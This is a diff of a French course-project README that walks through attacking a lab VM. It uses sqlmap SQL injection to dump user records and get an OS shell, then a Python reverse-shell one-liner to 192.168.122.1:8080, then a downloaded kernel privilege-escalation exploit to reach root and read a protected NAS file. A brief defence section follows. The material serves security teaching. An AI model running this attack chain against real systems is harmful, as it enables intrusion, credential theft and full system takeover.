@@ -1,4 +1,4 @@
-# INF8602 - Projet de session
+# INF8602 – Projet de session
 
 ## Prérequis :
 
@@ -15,34 +15,39 @@ IP_DE_LA_VM  inf8602.local
 
 Exploration à l'aide de sqlmap :
 ```bash
-./sqlmap.py --flush-session -u "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --method POST
+sqlmap --flush-session -u "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --method POST
 ```
 
 On constate que le serveur est vulnérable.
 
-Listons les tables:
+Listons les tables :
+
 ```bash
-./sqlmap.py -u  "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --method POST --dump -T users --stop 5
+sqlmap -u  "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --method POST --dump -T users --stop 5
 ```
 
 Les NAS ne sont pas là...
 
+### Obtention d'un shell
+
 On souhaite obtenir un shell :
 ```bash
-./sqlmap.py -u  "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --dbms=postgresql --method POST --no-cast --os-shell
+sqlmap -u  "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --dbms=postgresql --method POST --no-cast --os-shell
 ```
 
-On lance ensuite :
-```bash
-python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.122.1",8080));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
-```
-
-Puis dans un autre terminal :
+On lance ensuite, dans un autre teminal :
 ```bash
 nc -l -p 8080 -vvv
 ```
 
-Le shell est obtenu!
+Puis on lance la commande suivante dans le shell sqlmap :
+```bash
+python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.122.1",8080));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
+```
+
+**Le shell est obtenu!**
+
+### Vulnérabilité du système d'exploitation
 
 Il faut montrer que l'utilisateur est ``postgress`` et que les NAS sont dans ``/nas.txt`` :
 ```bash
@@ -51,7 +56,7 @@ ls -lsa /
 uname -a
 ```
 
-On constate que seul root peut accéder à ``nas.txt``. On constate également que le kernel fait partit de la liste suivante :
+On constate que seul root peut accéder à ``/secure_folder/nas.txt``. On constate également que le kernel (``5.11.0-44-generic``) fait partie de la liste suivante :
 ```c
 struct kernel_info kernels[] = {
     {"5.11.0-22-generic #23~20.04.1-Ubuntu", 0x33ceb0, 0x166c2c0},
@@ -72,7 +77,7 @@ struct kernel_info kernels[] = {
 };
 ```
 
-Il est possble de réaliser une elévation de privilège :
+Il est possible de réaliser une élévation de privilège :
 ```bash
 wget https://github.com/bourquejulien/INF8602-Projet/raw/main/SELinux/attack/exploit
 chmod +x exploit
@@ -83,17 +88,17 @@ bash -p
 Il est maintenant possible d'accéder au NAS :
 ```bash
 whoami
-cat /nas.txt
+cat /nas.csv
 ```
 
 ## Défense
 
-Pour relance la DB :
+Pour relance la DB (au besoin, tuer ``./exploit`` au préalable) :
 ```bash
 sudo systemctl restart postgresql
 ```
 
-**Plusieurs défenses existents.**
+**Plusieurs défenses existent.**
 
 Pour éviter les injections SQL :
 ```bash
